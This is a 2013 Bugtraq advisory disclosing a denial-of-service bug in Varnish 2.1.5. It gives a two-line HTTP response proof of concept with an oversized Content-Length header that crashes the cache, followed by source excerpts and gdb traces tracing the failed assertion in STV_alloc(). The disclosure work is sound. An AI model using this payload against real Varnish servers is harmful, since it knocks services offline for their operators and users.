@@ -1,0 +1,226 @@
+
+Date: Tue, 05 Mar 2013 20:51:53 +0000
+From: tytusromekiatomek@...hmail.com
+To: bugtraq@...urityfocus.com
+Subject: Varnish 2.1.5 DoS in STV_alloc() while parsing Content-Length header
+
+#######################################
+# STV_alloc()       |  ((st) != NULL) #
+#######################################
+#
+# Authors:
+#
+# 22733db72ab3ed94b5f8a1ffcde850251fe6f466
+# c8e74ebd8392fda4788179f9a02bb49337638e7b
+# AKAT-1
+#
+#######################################
+
+# Versions: 2.1.5
+# Full panic message:
+#
+
+Panic message: Assert error in STV_alloc(), stevedore.c line 192:#012  Condition((st) != NULL) not true.
+
+
+
+## Summary:
+Varnish 2.1.5 crash and restart (via assert) while parsing Content-Length: header (backend response).
+This could be used if attacker gained access to backed systems (for example injecting HTTP headers
+in buggy web application), or when backend system is not managed by the same entity as the varnish
+proxy.
+
+
+
+POC(response):
+-- cut --
+HTTP/1.1 200 OK
+Content-Length: 2147483647
+
+
+-- cut --
+
+
+# Brief and unfinished pointers on what happens here : 
+
+core:
+153 struct storage *
+154 STV_alloc(struct sess *sp, size_t size, struct objcore *oc)
+155 {
+156   struct storage *st;
+157   struct stevedore *stv = NULL;
+158   unsigned fail = 0;
+159 
+160   /*
+161    * Always try the stevedore which allocated the object in order to
+162    * not needlessly split an object across multiple stevedores.
+163    */
+164   if (sp->obj != NULL) {
+165     CHECK_OBJ_NOTNULL(sp->obj, OBJECT_MAGIC);
+166     if (sp->obj->objstore != NULL) {
+167       stv = sp->obj->objstore->stevedore;
+168       CHECK_OBJ_NOTNULL(stv, STEVEDORE_MAGIC);
+169     }
+170   }
+171 
+172   for (;;) {
+173     if (stv == NULL) {
+174       stv = stv_pick_stevedore();
+175       fail = 0;
+176     }
+177 
+178     /* try to allocate from it */
+179     AN(stv->alloc);
+180     st = stv->alloc(stv, size, oc);
+181     if (st != NULL)
+182       break;
+183 
+184     /* no luck; try to free some space and keep trying */
+185     if (EXP_NukeOne(sp, stv->lru) == -1)
+186       break;
+187 
+188     /* Enough is enough: try another if we have one */
+189     if (++fail == 50)
+190       stv = NULL;
+191   }
+192   CHECK_OBJ_NOTNULL(st, STORAGE_MAGIC);
+193   return (st);
+194 }
+
+
+Assertion from line 192 fails as STORAGE_MAGIC is defined as :
+cache.h line 276:
+-- cut --
+#define STORAGE_MAGIC   0x1a4e51c0
+-- cut --
+
+while the CHECK_OBJ_NOTNULL macro (include/miniobj.h ) is defined 
+as :
+
+#define CHECK_OBJ_NOTNULL(ptr, type_magic)        \
+  do {                \
+    assert((ptr) != NULL);          \
+    assert((ptr)->magic == type_magic);     \
+  } while (0)
+
+
+and st is NULL when it reaches the macro as 
+180     st = stv->alloc(stv, size, oc);
+
+stv structure is declared in stevandore.h as follows :
+
+-- cut --
+struct stevedore {
+  unsigned    magic;
+#define STEVEDORE_MAGIC   0x4baf43db
+  const char    *name;
+  storage_init_f    *init;  /* called by mgt process */
+  storage_open_f    *open;  /* called by cache process */
+  storage_alloc_f   *alloc;
+  storage_trim_f    *trim;
+  storage_free_f    *free;
+  storage_object_f  *object;
+  storage_close_f   *close;
+
+  struct lru    *lru;
+
+  /* private fields */
+  void      *priv;
+
+  VTAILQ_ENTRY(stevedore) list;
+};
+-- cut --
+
+so after the second pass when it tries to allocate it , it calls 
+
+180     st = stv->alloc(stv, size, oc);
+
+at which point st is cleared to 0x0
+alloc is a function pointer to storage_alloc_f
+$1 = (storage_alloc_f *) 0x44a29a <smf_alloc>
+smf_alloc is in turn defined in storage_file.c 
+
+Breakpoint 2, smf_alloc (st=0x7f5b34e48080, size=2147483647, oc=0x0) at storage_file.c:463
+(gdb) info args
+st = 0x7f5b34e48080
+size = 2147483647
+oc = 0x0
+
+
+in smf_alloc though it calls alloc_smf , where it gets 0
+so it returns NULL
+
+â”‚471             smf = alloc_smf(sc, size);
+â”‚472             if (smf == NULL) {
+â”‚473                     Lck_Unlock(&sc->mtx);
+â”‚474                     return (NULL);
+â”‚475             }  
+
+
+alloc_smf :
+
+â”‚231             struct smf *sp, *sp2;
+..
+
+
+(gdb) macro expand VTAILQ_FOREACH(sp, &sc->free[NBUCKET -1], status)
+expands to: for ((sp) = (((&sc->free[(128 / 4 + 1) -1]))->vtqh_first); (sp); (sp) = (((sp))->status.vtqe_next))
+
+
+
+basically while it cycles through this linked list, it reaches
+(gdb) p sp->size
+$13 = 798867456
+(gdb) nexti
+(gdb) p sp->size
+$14 = 798875648
+
+
+delta = 8192
+
+(gdb) p sp->size
+$20 = 798875648
+(gdb) nexti
+(gdb) p sp->size
+$21 = 798871552
+
+delta  = -4096
+
+(gdb) p sp->size
+$24 = 798871552
+(gdb) nexti
+(gdb) p sp->size
+$25 = 798875648
+
+
+delta = 4096
+
+one of the sp->status->vtsq_next must be null
+
+sc is some kind of allocator divided into free and used :
+
+Breakpoint 1, alloc_smf (sc=0x7f2d5424a300, bytes=2147483648) at storage_file.c:234
+234   assert(!(bytes % sc->pagesize));
+(gdb) p *sc
+$1 = {filename = 0x7f2d5421f040 "/tmp/dsdsd", fd = 3, pagesize = 4096, filesize = 6390988800, order = {
+    vtqh_first = 0x7f2d54205a80, vtqh_last = 0x7f2d542055b8}, free = {{vtqh_first = 0x0, vtqh_last = 0x7f2d5424a328}, 
+    {vtqh_first = 0x0, vtqh_last = 0x7f2d5424a338}, {vtqh_first = 0x0, vtqh_last = 0x7f2d5424a348}, {
+      vtqh_first = 0x0, vtqh_last = 0x7f2d5424a358}, {vtqh_first = 0x0, vtqh_last = 0x7f2d5424a368}, {
+      vtqh_first = 0x0, vtqh_last = 0x7f2d5424a378}, {vtqh_first = 0x0, vtqh_last = 0x7f2d5424a388}, {
+      vtqh_first = 0x0, vtqh_last = 0x7f2d5424a398}, {vtqh_first = 0x0, vtqh_last = 0x7f2d5424a3a8}, {
+      vtqh_first = 0x0, vtqh_last = 0x7f2d5424a3b8}, {vtqh_first = 0x0, vtqh_last = 0x7f2d5424a3c8}, {
+      vtqh_first = 0x0, vtqh_last = 0x7f2d5424a3d8}, {vtqh_first = 0x0, vtqh_last = 0x7f2d5424a3e8}, {
+      vtqh_first = 0x0, vtqh_last = 0x7f2d5424a3f8}, {vtqh_first = 0x0, vtqh_last = 0x7f2d5424a408}, {
+      vtqh_first = 0x0, vtqh_last = 0x7f2d5424a418}, {vtqh_first = 0x0, vtqh_last = 0x7f2d5424a428}, {
+      vtqh_first = 0x0, vtqh_last = 0x7f2d5424a438}, {vtqh_first = 0x0, vtqh_last = 0x7f2d5424a448}, {
+      vtqh_first = 0x0, vtqh_last = 0x7f2d5424a458}, {vtqh_first = 0x0, vtqh_last = 0x7f2d5424a468}, {
+      vtqh_first = 0x0, vtqh_last = 0x7f2d5424a478}, {vtqh_first = 0x0, vtqh_last = 0x7f2d5424a488}, {
+      vtqh_first = 0x0, vtqh_last = 0x7f2d5424a498}, {vtqh_first = 0x0, vtqh_last = 0x7f2d5424a4a8}, {
+      vtqh_first = 0x0, vtqh_last = 0x7f2d5424a4b8}, {vtqh_first = 0x0, vtqh_last = 0x7f2d5424a4c8}, {
+      vtqh_first = 0x0, vtqh_last = 0x7f2d5424a4d8}, {vtqh_first = 0x0, vtqh_last = 0x7f2d5424a4e8}, {
+      vtqh_first = 0x0, vtqh_last = 0x7f2d5424a4f8}, {vtqh_first = 0x0, vtqh_last = 0x7f2d5424a508}, {
+      vtqh_first = 0x0, vtqh_last = 0x7f2d5424a518}, {vtqh_first = 0x7f2d54205540, vtqh_last = 0x7f2d54205b08}}, 
+  used = {vtqh_first = 0x7f2d4c50c0c0, vtqh_last = 0x7f2d4c50c148}, mtx = {priv = 0x7f2d542205e0}}
+(gdb) 
+EOF
+
